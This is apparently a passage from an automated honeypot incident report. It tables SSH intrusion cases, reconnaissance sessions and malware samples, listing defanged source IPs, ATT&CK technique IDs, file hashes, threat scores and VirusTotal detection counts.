| IR-8e8bbaea4e0f | HIGH | `129.121.111[.]123` | 2026-10-10 08:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3abf28397e99 | HIGH | `103.20.122[.]54` | 2026-10-10 08:38 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-da7fc8a56611 | HIGH | `103.20.122[.]54` | 2026-10-10 08:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d34046d299be | HIGH | `144.31.146[.]233` | 2026-10-10 08:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-322d3e8eb8bb | HIGH | `51.178.84[.]57` | 2026-10-10 08:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ce947345a33a | HIGH | `144.31.146[.]233` | 2026-10-10 08:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-73a508611a0d | HIGH | `51.178.84[.]57` | 2026-10-10 08:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-99ec33f7664f | HIGH | `209.141.47[.]217` | 2026-10-10 08:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-05c54142d935 | HIGH | `209.141.47[.]217` | 2026-10-10 08:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ef58e435aa21 | HIGH | `59.126.224[.]134` | 2026-10-10 08:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3dcfe5f1239d | HIGH | `59.126.224[.]134` | 2026-10-10 08:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b4613659caf2 | HIGH | `43.164.190[.]83` | 2026-10-10 08:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-756311515656 | HIGH | `43.164.190[.]83` | 2026-10-10 08:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a51d9c30a37c | HIGH | `220.247.224[.]226` | 2026-10-10 08:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-aabd142d422e | HIGH | `220.247.224[.]226` | 2026-10-10 08:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-400187b75773 | HIGH | `87.106.47[.]28` | 2026-10-10 08:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d5f7b7666ad7 | HIGH | `87.106.47[.]28` | 2026-10-10 08:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f6fee4e69556 | HIGH | `68.210.120[.]110` | 2026-10-10 08:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-233838e8cb93 | HIGH | `68.210.120[.]110` | 2026-10-10 08:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-796e52425ebe | HIGH | `109.160.32[.]40` | 2026-10-10 08:50 | Y | 1 | 0 | `T1078 · T1592` |
| IR-66b9edcda700 | HIGH | `166.62.41[.]13` | 2026-10-10 08:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9a94629a3d06 | HIGH | `166.62.41[.]13` | 2026-10-10 08:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6c1fb6c5fe63 | HIGH | `182.43.235[.]75` | 2026-10-10 09:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-123ee6149ad5 | HIGH | `182.43.235[.]75` | 2026-10-10 09:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fd4aa9f9d83b | HIGH | `51.68.226[.]87` | 2026-10-10 09:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fef56106fc43 | HIGH | `51.68.226[.]87` | 2026-10-10 09:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1464a9748aba | HIGH | `101.47.15[.]26` | 2026-10-10 09:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3e298ab707fe | HIGH | `101.47.15[.]26` | 2026-10-10 09:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ec709d5ee4cd | HIGH | `47.236.197[.]68` | 2026-10-10 10:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b53842ee74e0 | HIGH | `47.236.197[.]68` | 2026-10-10 10:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0bccb333e3bb | HIGH | `154.221.20[.]92` | 2026-10-10 10:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d814480c308d | HIGH | `154.221.20[.]92` | 2026-10-10 10:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b6c134701793 | HIGH | `152.32.171[.]213` | 2026-10-10 10:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6f98292a1431 | HIGH | `152.32.171[.]213` | 2026-10-10 10:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6f2eec7b8ddb | HIGH | `218.90.138[.]78` | 2026-10-10 10:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3fcc522c2893 | HIGH | `218.90.138[.]78` | 2026-10-10 10:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-96d1960fdd71 | HIGH | `109.160.32[.]102` | 2026-10-10 10:14 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0266a2a9951e | HIGH | `95.90.13[.]168` | 2026-10-10 10:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-069eae04c50f | HIGH | `95.90.13[.]168` | 2026-10-10 10:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c7f439fd1744 | HIGH | `128.14.225[.]164` | 2026-10-10 10:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-83ac86cdf3b8 | HIGH | `128.14.225[.]164` | 2026-10-10 10:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5e5e4f084440 | HIGH | `45.78.204[.]246` | 2026-10-10 10:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4377dda0e7df | HIGH | `45.78.204[.]246` | 2026-10-10 10:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7bcdcfe2e09c | HIGH | `107.150.123[.]48` | 2026-10-10 10:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-576c4060af17 | HIGH | `130.12.180[.]51` | 2026-10-10 10:26 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-89ced505fb2b | HIGH | `122.176.122[.]24` | 2026-10-10 10:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-39739a6c2d02 | HIGH | `122.176.122[.]24` | 2026-10-10 10:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0d4d049f8800 | HIGH | `14.103.71[.]220` | 2026-10-10 10:45 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-f2b9172d4981 | HIGH | `87.106.44[.]172` | 2026-10-10 10:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2edc484e8c9c | HIGH | `87.106.44[.]172` | 2026-10-10 10:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1ade75eb32c3 | HIGH | `5.165.19[.]3` | 2026-10-10 10:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-178c0371e39f | HIGH | `5.165.19[.]3` | 2026-10-10 10:54 | Y | 0 | 0 | `T1078 · T1592` |
_… 33 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `185.89.156[.]101` | **3** | 2026-10-10 03:41 | 2026-10-10 06:42 | 1m | 0 | `T1592` | 🟢 LOW |
| `92.204.138[.]198` | **3** | 2026-10-10 03:04 | 2026-10-10 06:02 | 1m | 0 | `T1592` | 🟢 LOW |
| `92.204.138[.]198` | **3** | 2026-10-10 10:07 | 2026-10-10 14:02 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.255.200[.]90` | **2** | 2026-10-10 05:35 | 2026-10-10 06:25 | 4m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-10-10 10:52 | 2026-10-10 12:50 | 1m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-10 03:08 | 2026-10-10 04:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.89.156[.]101` | **2** | 2026-10-10 08:42 | 2026-10-10 10:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.135[.]36` | 1 | 2026-10-10 09:53 | 2026-10-10 09:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.83.87[.]34` | 1 | 2026-10-10 07:32 | 2026-10-10 07:33 | 14s | 0 | `T1592` | 🟢 LOW |
| `106.12.148[.]154` | 1 | 2026-10-10 06:26 | 2026-10-10 06:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.107[.]35` | 1 | 2026-10-10 13:11 | 2026-10-10 13:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]102` | 1 | 2026-10-10 10:14 | 2026-10-10 10:14 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]127` | 1 | 2026-10-10 03:38 | 2026-10-10 03:38 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]142` | 1 | 2026-10-10 05:14 | 2026-10-10 05:14 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]40` | 1 | 2026-10-10 08:49 | 2026-10-10 08:49 | 8s | 0 | `T1592` | 🟢 LOW |
| `112.164.146[.]173` | 1 | 2026-10-10 12:21 | 2026-10-10 12:22 | 20s | 0 | `T1592` | 🟢 LOW |
| `112.194.141[.]59` | 1 | 2026-10-10 13:49 | 2026-10-10 13:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.137.40[.]250` | 1 | 2026-10-10 08:43 | 2026-10-10 08:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.240.110[.]90` | 1 | 2026-10-10 04:13 | 2026-10-10 04:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.254.77[.]18` | 1 | 2026-10-10 02:57 | 2026-10-10 02:58 | 20s | 0 | `T1592` | 🟢 LOW |
| `115.190.207[.]155` | 1 | 2026-10-10 04:18 | 2026-10-10 04:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.199.176[.]30` | 1 | 2026-10-10 12:34 | 2026-10-10 12:35 | 25s | 0 | `T1592` | 🟢 LOW |
| `120.48.134[.]186` | 1 | 2026-10-10 04:29 | 2026-10-10 04:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.179[.]46` | 1 | 2026-10-10 13:15 | 2026-10-10 13:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.191.167[.]183` | 1 | 2026-10-10 03:51 | 2026-10-10 03:51 | 4s | 0 | `T1592` | 🟢 LOW |
| `121.191.167[.]183` | 1 | 2026-10-10 06:34 | 2026-10-10 06:34 | 3s | 0 | `T1592` | 🟢 LOW |
| `121.191.167[.]81` | 1 | 2026-10-10 03:38 | 2026-10-10 03:38 | 16s | 0 | `T1592` | 🟢 LOW |
| `121.229.25[.]10` | 1 | 2026-10-10 04:22 | 2026-10-10 04:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.229.9[.]97` | 1 | 2026-10-10 08:42 | 2026-10-10 08:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.155.132[.]40` | 1 | 2026-10-10 07:57 | 2026-10-10 07:57 | 5s | 0 | `T1592` | 🟢 LOW |
| `124.13.36[.]252` | 1 | 2026-10-10 10:42 | 2026-10-10 10:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-10 05:23 | 2026-10-10 05:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-10 08:30 | 2026-10-10 08:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-10 13:18 | 2026-10-10 13:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-10 03:47 | 2026-10-10 03:48 | 58s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-10 08:43 | 2026-10-10 08:44 | 51s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-10 08:38 | 2026-10-10 08:40 | 66s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-10 06:02 | 2026-10-10 06:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-10 08:07 | 2026-10-10 08:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-10 10:08 | 2026-10-10 10:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-10 12:10 | 2026-10-10 12:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-10 14:15 | 2026-10-10 14:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.71[.]220` | 1 | 2026-10-10 10:45 | 2026-10-10 10:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.44.31[.]59` | 1 | 2026-10-10 07:54 | 2026-10-10 07:54 | 25s | 0 | `T1592` | 🟢 LOW |
| `14.50.1[.]151` | 1 | 2026-10-10 06:19 | 2026-10-10 06:19 | 17s | 0 | `T1592` | 🟢 LOW |
| `151.177.98[.]248` | 1 | 2026-10-10 05:09 | 2026-10-10 05:09 | 18s | 0 | `T1592` | 🟢 LOW |
| `155.103.71[.]188` | 1 | 2026-10-10 14:20 | 2026-10-10 14:20 | 15s | 0 | `T1592` | 🟢 LOW |
| `156.225.1[.]17` | 1 | 2026-10-10 07:53 | 2026-10-10 07:53 | 15s | 0 | `T1592` | 🟢 LOW |
| `156.225.1[.]34` | 1 | 2026-10-10 04:37 | 2026-10-10 04:37 | 15s | 0 | `T1592` | 🟢 LOW |
| `167.99.134[.]69` | 1 | 2026-10-10 08:44 | 2026-10-10 08:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `168.181.217[.]179` | 1 | 2026-10-10 10:07 | 2026-10-10 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.210[.]105` | 1 | 2026-10-10 05:36 | 2026-10-10 05:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.6.109[.]238` | 1 | 2026-10-10 11:45 | 2026-10-10 11:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.65.149[.]188` | 1 | 2026-10-10 12:02 | 2026-10-10 12:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-10 07:44 | 2026-10-10 07:44 | 15s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-10 13:54 | 2026-10-10 13:54 | 15s | 0 | `T1592` | 🟢 LOW |
| `180.76.146[.]45` | 1 | 2026-10-10 14:04 | 2026-10-10 14:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.201.208[.]25` | 1 | 2026-10-10 08:42 | 2026-10-10 08:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.89.156[.]101` | 1 | 2026-10-10 13:42 | 2026-10-10 13:42 | 22s | 0 | `T1592` | 🟢 LOW |
| `187.120.25[.]148` | 1 | 2026-10-10 06:19 | 2026-10-10 06:19 | 10s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-10 06:47 | 2026-10-10 06:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `20.106.19[.]76` | 1 | 2026-10-10 12:22 | 2026-10-10 12:22 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.83.45[.]206` | 1 | 2026-10-10 11:10 | 2026-10-10 11:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `202.101.144[.]44` | 1 | 2026-10-10 10:24 | 2026-10-10 10:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.83.234[.]180` | 1 | 2026-10-10 04:14 | 2026-10-10 04:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `206.183.111[.]36` | 1 | 2026-10-10 10:26 | 2026-10-10 10:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `207.175.197[.]92` | 1 | 2026-10-10 08:08 | 2026-10-10 08:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `211.185.14[.]39` | 1 | 2026-10-10 10:24 | 2026-10-10 10:24 | 21s | 0 | `T1592` | 🟢 LOW |
| `218.158.192[.]193` | 1 | 2026-10-10 07:13 | 2026-10-10 07:13 | 21s | 0 | `T1592` | 🟢 LOW |
| `220.120.83[.]75` | 1 | 2026-10-10 04:25 | 2026-10-10 04:26 | 16s | 0 | `T1592` | 🟢 LOW |
| `222.113.207[.]183` | 1 | 2026-10-10 13:21 | 2026-10-10 13:21 | 17s | 0 | `T1592` | 🟢 LOW |
| `223.223.178[.]84` | 1 | 2026-10-10 03:09 | 2026-10-10 03:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-10-10 05:22 | 2026-10-10 05:22 | 9s | 0 | `T1592` | 🟢 LOW |
| `31.134.107[.]227` | 1 | 2026-10-10 12:51 | 2026-10-10 12:52 | 15s | 0 | `T1592` | 🟢 LOW |
| `34.77.82[.]48` | 1 | 2026-10-10 07:57 | 2026-10-10 07:57 | 15s | 0 | `T1592` | 🟢 LOW |
| `34.79.133[.]180` | 1 | 2026-10-10 08:29 | 2026-10-10 08:29 | 4s | 0 | `T1592` | 🟢 LOW |
| `36.189.207[.]159` | 1 | 2026-10-10 05:34 | 2026-10-10 05:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.174.42[.]18` | 1 | 2026-10-10 10:53 | 2026-10-10 10:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `41.59.82[.]183` | 1 | 2026-10-10 05:52 | 2026-10-10 05:52 | 11s | 0 | `T1592` | 🟢 LOW |
| `43.103.49[.]52` | 1 | 2026-10-10 09:22 | 2026-10-10 09:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-10-10 10:05 | 2026-10-10 10:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-10-10 07:07 | 2026-10-10 07:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.180.62[.]250` | 1 | 2026-10-10 14:30 | 2026-10-10 14:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-10-10 06:36 | 2026-10-10 06:36 | 7s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]5` | 1 | 2026-10-10 12:34 | 2026-10-10 12:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]223` | 1 | 2026-10-10 12:35 | 2026-10-10 12:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.82.78[.]108` | 1 | 2026-10-10 14:25 | 2026-10-10 14:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.252.53[.]96` | 1 | 2026-10-10 11:40 | 2026-10-10 11:41 | 31s | 0 | `T1592` | 🟢 LOW |
| `58.209.234[.]84` | 1 | 2026-10-10 08:40 | 2026-10-10 08:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.27.255[.]168` | 1 | 2026-10-10 05:15 | 2026-10-10 05:15 | 28s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]38` | 1 | 2026-10-10 11:44 | 2026-10-10 11:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]212` | 1 | 2026-10-10 03:22 | 2026-10-10 03:22 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]57` | 1 | 2026-10-10 04:52 | 2026-10-10 04:52 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]77` | 1 | 2026-10-10 05:35 | 2026-10-10 05:35 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]94` | 1 | 2026-10-10 09:15 | 2026-10-10 09:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]137` | 1 | 2026-10-10 09:33 | 2026-10-10 09:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]194` | 1 | 2026-10-10 04:38 | 2026-10-10 04:38 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-10-10 04:39 | 2026-10-10 04:39 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.240.236[.]119` | 1 | 2026-10-10 04:36 | 2026-10-10 04:36 | 1s | 0 | `T1592` | 🟢 LOW |
| `73.48.231[.]163` | 1 | 2026-10-10 08:18 | 2026-10-10 08:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-10 06:04 | 2026-10-10 06:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-10-10 04:27 | 2026-10-10 04:27 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-10-10 12:34 | 2026-10-10 12:34 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `83.143.159[.]147` | 1 | 2026-10-10 03:15 | 2026-10-10 03:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]31` | 1 | 2026-10-10 04:14 | 2026-10-10 04:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.219.138[.]122` | 1 | 2026-10-10 14:11 | 2026-10-10 14:11 | 12s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-10-10 03:18 | 2026-10-10 03:18 | 9s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]49` | 1 | 2026-10-10 07:13 | 2026-10-10 07:13 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.204.138[.]198` | 1 | 2026-10-10 08:04 | 2026-10-10 08:04 | 31s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]196` | 1 | 2026-10-10 04:36 | 2026-10-10 04:36 | 7s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
